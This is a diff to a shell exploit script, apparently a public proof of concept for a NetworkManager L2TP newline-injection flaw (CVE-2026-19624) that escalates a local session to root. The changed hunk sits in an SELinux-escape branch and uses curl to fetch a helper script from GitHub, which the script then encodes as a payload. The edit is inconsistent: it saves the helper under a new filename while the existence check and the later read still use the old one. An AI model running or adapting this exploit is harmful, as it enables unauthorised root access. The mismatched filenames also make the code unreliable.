@@ -4,7 +4,7 @@
 #
 # CVE-2026-19624
 #
-# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
+# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root/
 # https://github.com/linnemanlabs/advisories/
 #
 # end-to-end exploit, run from local login session
@@ -74,8 +74,8 @@ if [ "${selinux}" == "true" ];then
     # systemd activation-pull selinux escape
     # see https://linnemanlabs.com/posts/confined-root-is-still-root/
     if [ ! -f activation-pull.sh ];then
-      echo "[*] missing activation-pull.sh, pulling from github"
-      curl -s -o "activation-pull.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/selinux/confined-root-is-still-root/activation-pull.sh"
+      echo "[*] missing activation-pull-restart.sh, pulling from github"
+      curl -s -o "activation-pull-restart.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/nm-l2tp/activation-pull-restart.sh"
     fi
     b64p="$( cat activation-pull.sh | gzip | base64 -w0 )"
     outfile="/tmp/ipsec.out-$( date +%s )"
